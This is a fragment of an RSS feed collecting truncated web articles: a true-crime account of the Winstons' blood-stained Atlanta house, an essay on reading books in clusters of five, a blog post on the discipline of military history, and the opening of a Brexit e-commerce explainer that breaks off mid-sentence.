          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603728037086-9YJ2TZXF4D68V9OZLV3P/ke17ZwdGBToddI8pDm48kI5befnj5g8puDzazwGXgfwUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKc7G-TKKdyJnmugNlXu_H9zCdZiK1Gt8ZvgG3tVbtILaqE3ic1vCx8_k8jxhWwNfEu/paperpic.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603728037086-9YJ2TZXF4D68V9OZLV3P/ke17ZwdGBToddI8pDm48kI5befnj5g8puDzazwGXgfwUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKc7G-TKKdyJnmugNlXu_H9zCdZiK1Gt8ZvgG3tVbtILaqE3ic1vCx8_k8jxhWwNfEu/paperpic.jpg" data-image-dimensions="1458x544" data-image-focal-point="0.5,0.5" alt="paperpic.jpg" data-load="false" data-image-id="5f96f2a4de3c872760fb12f4" data-type="image" src="https://www.trulyadventure.us/paperpic.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="23" id="block-yui_3_17_2_1_1603730790512_26330"><div><p><strong><em>Minnie and Willie Winston, during their crisis</em></strong></p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603724304384_74254"><div><p>Minnie got out of the tub. As she walked, she stepped into a red puddle. It appeared to bubble up through the tile floor right at her feet. She was confused. “I didn’t get scared,” she later recalled, “because I didn’t know where it was coming from.” Then fear invaded: it looked like blood<em>. </em>Her husband Willie may have hurt himself. The retiree was in ill health and frail, perpetually tethered to his bed by old age and his dialysis machine.</p><p>She ran out of the bathroom and into the hallway, calling Willie’s name, searching for any sign of what was awry. When she got in the hall, she froze. The red liquid was everywhere; along the baseboard and smeared across the walls, dime- and silver dollar-sized droplets splattered everywhere around her. That’s when a geyser of blood shot through the wooden floor, projecting out as though the home had nicked an invisible artery, further spreading and painting the hallway red.</p><p>She made it to Willie’s room. She shook him awake. “Come look at all of this red stuff coming out of the floor.”</p><p>By the time Willie got out there, puddles had settled like a still red lake.</p><p>As husband and wife stood gazing in astonishment, so began the case of a “house of blood” that remains unparalleled in both police and parapsychology files, a fault line between a family’s tranquility and the perpetual violence of a world torn apart.&nbsp;</p></div></div><div data-block-type="51" id="block-yui_3_17_2_1_1603893064030_25957"><div>


<div>
  <form data-form-id="5f99775f5821db03030ca1a9" autocomplete="on" method="POST" onsubmit="return (function (form) {
    Y.use('squarespace-form-submit', 'node', function usingFormSubmit(Y) {
      (new Y.Squarespace.FormSubmit(form)).submit({
        formId: '5f99775f5821db03030ca1a9',
        collectionId: '5f969048b0954566e6648ab0',
        objectName: 'page-5f969048b0954566e6648ab0'
      });
    });
    return false;
  })(this);">
    
    
    <p>We respect your privacy.</p>
    <p>Thank you!</p>
    
  </form>
</div>
</div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603705823477_60809"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603712118541-K0T8XKGIQW72I3KJL1WE/ke17ZwdGBToddI8pDm48kLQV9dPllVtWy4F5Uu5QBwAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKchnHLEx5GwY7ZN-HE9rWK1BlwQ4FLNcuDxp6bhyh7OvCHYt4JEX4Y-KDEekcY9kZM/page%2Bbreak%2Bmarker.png" data-image="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603712118541-K0T8XKGIQW72I3KJL1WE/ke17ZwdGBToddI8pDm48kLQV9dPllVtWy4F5Uu5QBwAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKchnHLEx5GwY7ZN-HE9rWK1BlwQ4FLNcuDxp6bhyh7OvCHYt4JEX4Y-KDEekcY9kZM/page%2Bbreak%2Bmarker.png" data-image-dimensions="1366x147" data-image-focal-point="0.5,0.5" alt="page+break+marker.png" data-load="false" data-image-id="5f96b4768cd4814a3dd9c67f" data-type="image" src="https://www.trulyadventure.us/page+break+marker.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603705823477_61098"><div><p>Brenda Dipple, 28, had come to Atlanta from out west where the Texas native had studied community health at New Mexico State before switching her focus to police science. Her father had been a daredevil paramedic with a rescue crew in Texas, helping wayward souls stranded on mountains and hiking trails. Despite her relative youth, Brenda now had a chance to help people in another way as a lab technician on the Atlanta Police Department’s Major Cases squad. Her role may not have been glamorous, but she could help find justice for victims who had been deprived of their voices. With a proud Black and Latin heritage, she had a big legacy and responsibility to live up to.</p><p>Most cases for Brenda and her fellow lab techs were routine, and many were grim. As a blood tech, her energy was channeled in careful observation and collection of samples, cultivating an eye for droplets and patterns that might be missed by the most experienced detectives.</p><p>But this day in September brought something far stranger. In the middle of the night, the late-shift homicide squad had been celebrating an officer's birthday with cake. Downtime was not typical for the APD that year; the city had seen a spike in murder--a result of the flourishing drug trade and growing poverty--that nearly tripled from the year before.</p><p>The telephone cut into the office chatter. When the detective closest to the phone answered, confusion clouded his face.</p><p>"Blood coming down <em>walls</em>? But there's no body?"</p><p>The detective on the phone briefed his colleagues. “An elderly couple called the fire department... She says there’s blood everywhere, but no sign of a body.”</p><p>One of the detectives present, Steve Cartwright, would document his reaction to this in interviews, police records, and a later memoir, <em>Diary in Blue</em>.&nbsp;</p><p>"How did the couple explain it?" asked Cartwright.</p><p>The other detective shook his head. "They couldn't."</p><p>Lab tech Brenda Dipple, as well as a slew of other officers, were gradually beckoned to go to 1114 Fountain Drive, which was in the Mozley Park neighborhood on the Black side of Atlanta, located about three miles from the downtown area. The dwellings in this neighborhood alternated between Folk Victorian cottages and Craftsman bungalows that were built on small lots with no driveways.</p><p>The house to which the police were called mostly blended in with others on that side of town, with a brown-brick façade, green shutters, and concrete steps leading to a walkway that parted the middle of the front lawn. The neighborhood was working class to its core, where systemic, perpetual segregation from better funded white areas of Atlanta meant people had to look out for each other.</p></div></div><div data-block-type="23" id="block-yui_3_17_2_1_1603729277175_34361"><div><div id="yui_3_17_2_1_1603729747583_259">
<div data-block-type="5" id="block-yui_3_17_2_1_1598031461286_18305"><div id="yui_3_17_2_1_1601311116179_133">








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper" id="yui_3_17_2_1_1601311116179_132">

        <div id="yui_3_17_2_1_1601311116179_131">
          
            <div data-animation-role="image" data-description="" id="yui_3_17_2_1_1601311116179_130">
            
            <p><img data-src="https://pbs.twimg.com/media/EkbSlUKU0AAKloy?format=jpg&amp;name=small" data-image="https://pbs.twimg.com/media/EkbSlUKU0AAKloy?format=jpg&amp;name=small" data-image-dimensions="1318x1800" data-image-focal-point="0.5,0.5" data-parent-ratio="11.2" alt="Matthew Pearl (promo).jpg" data-image-resolution="750w" src="https://pbs.twimg.com/media/EkbSlUKU0AAKloy?format=jpg&amp;name=small"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>The Haunted Beach House</p></div>
              

              
                <div><p>When a couple discovers their dream home is haunted, they decide to make a pact with the spirits. In old world Florida, that's a risky proposition.</p></div>
              

              
                <div><div data-width-percentage="23.6"></div></div>
              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div></div></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603705823477_63339"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603712136828-Z2SCUFDYTKMS3W7UTT3F/ke17ZwdGBToddI8pDm48kLQV9dPllVtWy4F5Uu5QBwAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKchnHLEx5GwY7ZN-HE9rWK1BlwQ4FLNcuDxp6bhyh7OvCHYt4JEX4Y-KDEekcY9kZM/page%2Bbreak%2Bmarker.png" data-image="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603712136828-Z2SCUFDYTKMS3W7UTT3F/ke17ZwdGBToddI8pDm48kLQV9dPllVtWy4F5Uu5QBwAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKchnHLEx5GwY7ZN-HE9rWK1BlwQ4FLNcuDxp6bhyh7OvCHYt4JEX4Y-KDEekcY9kZM/page%2Bbreak%2Bmarker.png" data-image-dimensions="1366x147" data-image-focal-point="0.5,0.5" alt="page+break+marker.png" data-load="false" data-image-id="5f96b4883f9b191e59bf3fe3" data-type="image" src="https://www.trulyadventure.us/page+break+marker.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603705823477_63628"><div><p>Once they recovered from the shock of their discovery, Minnie and Willie carefully explored their surroundings. Willie was a rail thin man whose favorite suspenders looked more 1950s than late ‘80s, and oversized glasses similar to his wife’s. They discovered the blood was not only in the bathroom and hall, but the kitchen and living room as well. In their 22 years living in the residence--and for that matter, in their whole lives--this was the first time they had ever seen anything like it.&nbsp;</p><p>Reluctantly, they had called 911, and because of the unclear nature of the situation the dispatchers cast a wide net. Soon Fountain Drive was dotted with emergency vehicles, blades of blue and red and white light slicing through the thick fog that covered the uneven roads. EMTs came in with a logical goal--to see if one of the Winstons was injured and therefore the unwitting source of blood. <em>There’s not a scratch on either of them</em>, an EMT reported to a colleague. “I’m not bleeding,” Willie confirmed. “My wife’s not bleeding. Nobody else was here.” There was also no leak or contamination from Willie’s dialysis equipment.&nbsp;</p><p>The property managers, a father and son both named Alfred, also arrived, flashlights shining around the dugout basement. There were no burst pipes that could have released some kind of foreign substance. They found more bloodstains beneath the television stand in the basement. Alfred Jr., hands on hips, looked around, baffled.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603724304384_115584"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603728225234-XEMGY7DS3KJ9BULVZE1T/ke17ZwdGBToddI8pDm48kHTfDIqM7Z307aKMaeiPigMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2doMPfkcn8MmNJSBUUh7q0FZrm4GKSGb10_07SqNQTPvCCjLISwBs8eEdxAxTptZAUg/jones.png" data-image="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603728225234-XEMGY7DS3KJ9BULVZE1T/ke17ZwdGBToddI8pDm48kHTfDIqM7Z307aKMaeiPigMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2doMPfkcn8MmNJSBUUh7q0FZrm4GKSGb10_07SqNQTPvCCjLISwBs8eEdxAxTptZAUg/jones.png" data-image-dimensions="1917x725" data-image-focal-point="0.5,0.5" alt="jones.png" data-load="false" data-image-id="5f96f35fb8838c52a7065e6b" data-type="image" src="https://www.trulyadventure.us/jones.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603724304384_115874"><div><p>Detective Cartwright of the APD, whipping out his notepad, sensed an open-and-shut case. It came down to this: houses do not bleed. There are no blood vessels or arteries behind walls; brick and mortar has no heartbeat. If this was blood in the Winston residence, then someone put it there, either via injury, death, or most likely, a simple misunderstanding.&nbsp;</p><p>“How’s your eyesight?” the detective asked Minnie.</p><p>“It’s fine. And I <em>know</em> what I saw.” Minnie did not like to be dismissed. The former schoolteacher made it clear she would not be condescended to, a hint the detective took.</p><p>Willie, who rocked in his chair in their tidy living room, confirmed his wife’s descriptions.</p><p>“Had the house been locked?” Cartwright asked.</p><p>“Yes.” And the alarm had been set. “No one could have gotten inside, and I know what I saw,” Minnie repeated.</p><p>Except, police officers thought, the so-called blood could be anything--paint or rusty fluid of some kind.&nbsp;</p><p>Brenda Dipple, however, felt unsettled from the moment she arrived. Usually a lab tech was an invisible …</p></div></div></div></div></div></div></section></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.trulyadventure.us/blood-house">https://www.trulyadventure.us/blood-house</a></em></p>]]>
            </description>
            <link>https://www.trulyadventure.us/blood-house</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088849</guid>
            <pubDate>Fri, 13 Nov 2020 23:36:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I Read]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25088757">thread link</a>) | @simonebrunozzi
<br/>
November 13, 2020 | https://www.spakhm.com/p/how-i-read | <a href="https://web.archive.org/web/*/https://www.spakhm.com/p/how-i-read">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I try to read a lot, though I'm not nearly as voracious a reader as people who have a reputation for it. I have no idea how Marc Andreessen or Patrick Collison read as much as they do, especially given the enormous demands on their time. The most plausible explanation is that they're aliens with ungodly information processing abilities. I'm human, so I shoot for 40 pages every day, and fail maybe a third of the time. That works out to about 10,000 pages or ~20 books every year. </p><p>Reading twenty books a year gets you a lot. Consider: one book gives you more knowledge about a subject than almost every other person on the planet, because people don't read. Two books on the same subject give you more knowledge than almost any reader, because people don't read two books about the same thing. How many people who read The Power Broker went on to read a second book about Robert Moses? I'd wager not many.</p><p>Beyond two books on a subject, there is a long utility dip. People who bothered to read more than two books about Robert Moses, are either obsessed with him or study him for a living, which means they've read much, much more about him. So two books on a subject, at least with respect to competitive edge, is an inflection point. After you read two, you get diminishing returns.</p><p>There is a way to get around this limitation. A single book is a pinhole view of the world set up by the author. You have no input into its contents, and therefore cannot change the orientation of this view. But you do choose the books you select. That means you can stitch together multiple pinhole views into a unique lens to examine the world— one that no one else will have unless they use the same list of books to stitch together the same lens. </p><p>For example, you can look at the world through history of technology that became ubiquitous. Here is one possible list of books to stitch together this lens: <a href="https://amzn.to/36fB6Vb">The Victorian Internet</a>, <a href="https://amzn.to/2GHE8Jh">Empires of Light</a>, <a href="https://amzn.to/2Ua2P49">The Wright Brothers</a>, <a href="https://amzn.to/38pdoIY">The Network</a>, <a href="https://amzn.to/3n3SeEf">Hackers</a>. Very few people in the world read all five of these books. Even within Silicon Valley, where everyone's living depends on creating new ubiquitous technology, your understanding of how technology becomes ubiquitous will be in the 95th percentile (and likely higher) if you read these five. You will now be armed with a unique instrument that few others possess, and assuming twenty books per year, it only took you three months to acquire.</p><p>Another example is to look at American history and the dynamics of failure by studying biographies of U.S. presidents who sought reelection and lost. There were ten: John Adams, John Quincy Adams, Martin Van Buren, Benjamin Harrison, William H. Taft, Herbert Hoover, Gerald Ford, Jimmy Carter, George H.W. Bush, and now Donald J. Trump. It may be difficult to stomach ten presidential biographies in a row, but it's doable to read five. That's enough to pick up a new lens. Another three months; another sophisticated instrument to examine the world at your disposal.</p><p>I settled on clusters of five and almost never read a single book in isolation. Less than five feel lacking; more than five gets repetitive. Every cluster has a goal of the form "study <code>X</code> through <code>Y</code>". Study American history through technological expansion, or study failure through one term presidents are just a few examples. I try to be creative and make <code>Y</code> unusual. For instance, everyone likes to read about presidents who are believed to be successful. A simple trick is to inverse it and read about unsuccessful ones instead. Or skip the presidents altogether, and read about vice presidents. It doesn't matter what <code>Y</code> is because you're trying to study <code>X</code>, and it's more fun to make <code>Y</code> unusual.</p><p>I don't bother diversifying books within a cluster by time period, cultural or linguistic background of the author, or anything like that. I simply try and find the best books on the subject. Sometimes they turn out to be diverse along some axes; other times they're homogenous. I never read forewords or prefaces and always finish every book in a cluster. I prefer paper to digital, and used books to new ones. I never take notes or, god forbid, create flashcards. My goal is to suck the juice out of a book, not to hold on to pieces of the carcass. If I ever need to remember a specific detail, it's always waiting for me on the shelf.</p><p>This system gives me four new instruments per year, each capable of inspecting the world in a different way. Rather than pick the instruments at random I try to be strategic and collect them into a mental lab. I visualize the lab as a room with multiple stations. Each station has a collection of related instruments on it. When I'm faced with a problem I can go to the right station and examine the problem through the instruments available on that station. All this is physically materialized on my bookshelf. Some day when I become less mobile, I plan to dedicate a literal room to it.</p><p>I don't maintain lists of books I want to read, and don't plan a sequence of instruments to acquire in advance. Once I'm done reading a cluster of books, I ask myself: <em>what instrument can I add to double the utility of my lab</em>? Another way to phrase this question is "what is the most important subject that I know the least about?" It's easy to think of many possible answers to this question; I then pick the answer that seems the most interesting, construct a new cluster of five books, and recurse.</p><p>Four instruments per year may not seem like much, but consider: in five years you will have about twenty mental instruments, all of which interrelate and reinforce each other. In ten years you will have an impressive lab of forty instruments. And it will be unique— no other mental lab on the planet will be able to inspect the world in the way that yours can.</p><p>Because the instruments are constructed from books, they are endlessly upgradeable. Sometimes you might choose to upgrade an existing instrument to increase its power and get higher resolution, rather than acquire a new one. You can do that one book at a time. To use the examples above, you can read another book about ubiquitous technology, or another book about a one term president.</p><p>If you organize your reading this way, your bookshelf won't be arranged by genre like a typical bookstore. Rather than having sections for e.g. biographies, essays, novels, military history, all sorted by author, you will instead have sections for addressing different problems, likely sorted by clusters of books in order that you encountered them. The arrangement won't make sense to anyone except you. But you'll be able to find what you need instantaneously, and your capacity to examine the world from different perspectives will dramatically increase.</p><p>Waiting five, ten, fifteen years to build a mental lab may seem like an impossibly long time. But you don’t have to wait. It’s a pleasure to read about the Wright brothers, or proliferation of the telegraph, or early computer culture! And in a measly three months you’ll have acquired a fresh way of looking at the world. Already you will be a different person. Then you keep going, and keep looking for new instruments to double the utility of existing ones. And in one year? You will look back at today’s version of yourself and find it unrecognizable.</p><p><strong>TL;DR:</strong> Read ~40 pages/day, assume 30% failure rate. That's 10k pages and ~20 books annually. Pick a problem, and read clusters of five books to study that problem from a unique perspective. Visualize each cluster as an instrument to inspect the world. Collect instruments into a mental lab, with various stations for related instruments. You can upgrade the instruments one book at a time. Have your bookshelf reflect this mental image. Win the decade, not the day. Start now and never stop.</p></div></div>]]>
            </description>
            <link>https://www.spakhm.com/p/how-i-read</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088757</guid>
            <pubDate>Fri, 13 Nov 2020 23:23:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Collections: Why Military History?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25088667">thread link</a>) | @parsecs
<br/>
November 13, 2020 | https://acoup.blog/2020/11/13/collections-why-military-history/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/11/13/collections-why-military-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week, I want to talk about the discipline of military history: what it is, why it is important and how I see my own place within it.  This is going to be a bit of an unusual collections post as it is less about the past itself and more about how we study the past; it is also going to be a bit unusual in that it is mostly my own personal reflections, rather than a historical argument.</p>



<p>We do quite a lot of different kinds of history here on the blog.  There is a fair bit of<a href="https://acoup.blog/2019/09/07/new-acquisitions-class-status-and-the-early-church/"> social history,</a> some <a href="https://acoup.blog/2019/12/05/collections-a-trip-through-thucydides-fear-honor-and-interest/">intellectual </a><a href="https://acoup.blog/2019/12/12/collections-a-trip-through-cicero-natural-law/">history</a>, just a<a href="https://acoup.blog/2019/05/20/new-acquisitions-elective-monarchy-and-the-future-of-westeros/"> little bit of political history</a> and an absolute <a href="https://acoup.blog/tag/organic-economy/"><em>ton</em> of economic history</a>.  Obviously, I think all of those analytical lenses (and several I have not done, of course) are very important ways of understanding the past.  But a lot of what we discuss on the blog fits, narrowly or broadly, into the realm of <strong>military history</strong>.  And I want to talk about that.</p>



<p><strong>Now I should note that I do not consider myself purely a military historian</strong> – indeed, in my experience, few historians are ‘pure’ anything and if you narrow down their specialization enough, you simply end up with, “I am a historian of things which interest me” followed by a long list of what those are.  <strong>I see myself as both an economic and military historian (of the Mediterranean world, broadly construed)</strong> and my research tends to exist in the places where those two strands meet.  Sometimes that means processes that read as non-military (if it isn’t evident I have active research projects on farming and metal production, you haven’t been here long!) and sometimes those projects are more narrowly military.  <strong>I am a firm believer that a historian must be prepared to use whatever tools are going to provide the best answers to their research questions</strong>; for my own work, that has included (basic) statistical analysis, textual close reading, economic theory, archaeology (both traditional and experimental), social history, and even some chemistry and physics.  Whatever works!  But certainly, the methods of military history are one tool in my toolbox, even when I am looking to answer questions about non-military aspects of Mediterranean antiquity.</p>



<p><strong>It is no real secret that as a discipline, military history is sometimes held in low regard by other historians</strong>.  There are a number of reasons for this.  Often it has to do with outdated views on what military history <em>is</em> and what military historians <em>do</em>.  Frequently military history, because it has a large enthusiast and amateur audience, is regarded as an amateur field (something which is not helped by publishers who push quite out reams of quite frankly substandard works of this sort) lacking in sophistication, which is not accurate, but often believed.  And perhaps most often, in my experience, <strong>these opinions serve as cover for a deeper conviction that studying militaries and warfare is icky and only done by people who <em>like</em> war</strong> (when I was a student, this opinion when it was expressed by a certain generation of scholars, now mostly retired, came with a <em>very</em> predictable dose of Vietnam-era anti-military sentiment).  Often it seems the study of military history is neglected by other historians precisely because they find the subject matter uncomfortable.</p>



<p>So I want to talk about three major things here: what military history actually is and how it is done these days, why we should study military history and finally what my experience of being a military historian (both as a scholar and a teacher) has been, particularly given that I am a life-long civilian.  </p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<h2>What is Military History?</h2>



<p>The popular conception of military history – indeed, the conception sometimes shared even by other historians – is that it is fundamentally a field about charting the course of armies, describing ‘great battles’ and praising the ‘strategic genius’ of this or that ‘great general.’  One of the more obvious examples of this assumption – and the contempt it brings – comes out of the popular CrashCourse youtube series.  When asked by their audience to cover military history related to their coverage of <em>the American Civil War</em>, the response was <a href="https://youtu.be/25HHVDOaGeE">this video listing battles </a>and reflecting on the pointless of the exercise, as if a list of battles was all that military history was (the same series would later say that military historians <a href="https://youtu.be/rlx6ur_D51s?t=323">don’t talk about about food</a>, a truly baffling statement given the important of logistics studies to the field; certainly in my own subfield, military historians tend to talk about food more than any other kind of historian except for dedicated food historians).</p>



<p>The term for works of history in this narrow mold – all battles, campaigns and generals – is <strong>“drums and trumpets” history, a term generally used derisively</strong>.  The study of battles and campaigns emerged initially as a form of training for literate aristocrats preparing to be officers and generals; it is little surprise that they focused on aristocratic leadership as the primary cause for success or failure.  Consequently, the old ‘drums and trumpets’ histories also had a tendency to<a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/"> glory in war </a>and to glorify commanders for their ‘genius’ although this was by no means universal and works of history on conflict as far back as Thucydides and Herodotus (which is to say, as far back as there have been any) have reflected on the destructiveness and tragedy of war.  But military history, like any field, matured over time; I should note that it is <a href="https://acoup.blog/2020/02/07/collections-the-fremen-mirage-part-iiia-by-the-princess-irulan/">hardly the only field of history to have less respectable roots</a> in <a href="https://acoup.blog/2020/02/14/collections-the-fremen-mirage-part-iiib-myths-of-the-atreides/">its quite recent past</a>.  Nevertheless, as the field matured and moved beyond military aristocrats working to emulate older, more successful military aristocrats into a field of scholarly inquiry (still often motivated by the very real concern that officers and political leaders be prepared to lead in the event of conflict) the field has become far more sophisticated and its gaze has broadened to include not merely non-aristocratic soldiers, but non-soldiers more generally.</p>



<p>Instead of the ‘great generals’ orientation of ‘drums and trumpets,’ the field has moved in the direction of three major analytical lenses, laid out quite ably by Jeremy Black in “Military Organisations and Military Charge in Historical Perspective” (<em>JMH</em>, 1998). <strong> He sets out the three basic lenses as technological, social and organizational, which speak to both the questions being asked of the historical evidence but also the answers that are likely to be provided</strong>.  I should note that these lenses are mostly (though not entirely) about <em>academic</em> military history; much of the amateur work that is done is still very much ‘drums and trumpets’ (as is the occasional <em>deeply frustrating</em> books from some older historians we need not discuss here), although that is of course not to say that there isn’t good military history being written by amateurs or that all good military history narrowly follows these schools.  <strong>This is a classification system, not a straight-jacket and I am giving it here because it is a useful way to present the complexity and sophistication of the field as it is, rather than how it is imagined by those who do not engage with it.</strong></p>



<p>(I should note that <em>campaign studies</em> have not been entirely abandoned either.  What distinguishes the modern campaign or battle study from the old ‘drums and trumpets’ style is a broader use of historical causality that reaches beyond just upper-level command decisions. <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/"> Our recent recommendation, <em>Shattered Sword</em></a> is a good example of how what might have been a ‘drums and trumpets’ narrative of admirals and captains can instead be developed, using more sophisticated historical methods, into a much more complete and compelling historical argument about organizations, doctrines, technologies and so on.  And of course campaign histories will never go out of style – they are the essential foundation on which all other kinds of analysis must be laid)</p>



<p><strong>The technological approach is perhaps the least in fashion these days</strong>, but Geoffery Parker’s <em>The Military Revolution</em> (2nd ed. 1996) provides an almost pure example of the lens.  This approach tends to see changing technology – not merely military technologies, but often also civilian technologies – as the main motivator of military change (and also success or failure for states caught in conflict against a technological gradient).  <strong>Consequently, historians with this focus are often asking questions about how technologies developed, why the developed in certain places, and what their impacts were</strong>.  Another good example of the field, for instance, is the debate about the impact of <a href="https://www.amazon.com/gp/product/0700623833/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&amp;psc=1">rifled muskets</a> in the <a href="https://www.amazon.com/gp/product/171985727X/ref=ppx_yo_dt_b_asin_title_o07_s00?ie=UTF8&amp;psc=1">American Civil War</a>.  While there has been a real drift away from seeing technologies themselves as decisive on their own (and thus a drift away from mostly ‘pure’ technological military history) in recent decades, this sort of history is very often paired with the others, looking at the ways that social structures, organizational structures and technologies interact.</p>



<p><strong>Perhaps the <em>most</em> popular lens for military historians these days is the social one</strong>, which used to go by the “new military history” (<em>decades </em>ago – it was the standard form even back in the 1990s) but <strong>by this point comprises probably the bulk of academic work on military history</strong>.  In its narrow sense, the social perspective of military history seeks to understand the army (or navy or other service branch) as an extension of the society that created it.  We have, you may note,<a href="https://acoup.blog/2020/05/22/collections-the-battle-of-helms-deep-part-iv-men-of-rohan/"> done a bit of that here</a>.  Rather than understanding the army as a pure instrument of a general’s ‘genius’ it imagines it as a <em><strong>socially embedded</strong></em> institution – which is …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/11/13/collections-why-military-history/">https://acoup.blog/2020/11/13/collections-why-military-history/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/11/13/collections-why-military-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088667</guid>
            <pubDate>Fri, 13 Nov 2020 23:10:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Brexit and the Implications for Ecommerce]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25088638">thread link</a>) | @SwiftERM
<br/>
November 13, 2020 | https://www.swifterm.com/brexit-and-the-implications-for-ecommerce/ | <a href="https://web.archive.org/web/*/https://www.swifterm.com/brexit-and-the-implications-for-ecommerce/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Brexit and the implications for ecommerce. Brexit is on agendas across the country and the main cause for concern is the ongoing uncertainty surrounding it, for whilst uncertainty remains, it’s hard to plan ahead. Still, everyone wants to know: how will Brexit impact UK trade?</p><p>For the UK ecommerce and logistics market, the focus is on the movement of goods to EU countries. Here we collate some of the potential implications of different Brexit scenarios including information on importing, exporting, VAT, customs and duties, and how processes may change when we leave the EU.</p><p>Although no one can currently be sure what kind of Brexit the UK will get, it is worth keeping these variables and implications in mind. None of this should be taken as legal advice but, as Brexit talks progress, it may be wise to start assessing how they may impact your business and if your partners and suppliers have started thinking about them too.</p><h2>Implications of Brexit in a no-deal scenario</h2><h3>High-level implications for the UK in a no-deal scenario:</h3><p>The UK becomes a third country whose relations with the EU would be governed by general international public law, including rules of the World Trade Organisation (WTO). The WTO deals with the global rules of trade between nations. Its main function is to ensure that trade flows as smoothly, predictably and freely as possible.</p><p>The European Union must apply its regulation and tariffs at borders with the UK as a third country, including checks and controls for customs, sanitary and phytosanitary standards (to protect humans, animals, and plants from diseases, pests, or contaminants that may enter an EU state), and verification of compliance with EU norms.</p><p>Transport between the UK and the EU would be impacted and sanitary and phytosanitary controls at borders could cause significant customs delays through difficulties at ports and longer road transport times.</p><p>Depending on the circumstances leading to withdrawal without an agreement, the EU may wish to enter into negotiations with the UK as a third country.</p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122,h_740/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122,h_740/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg" alt="Brexit Implications for 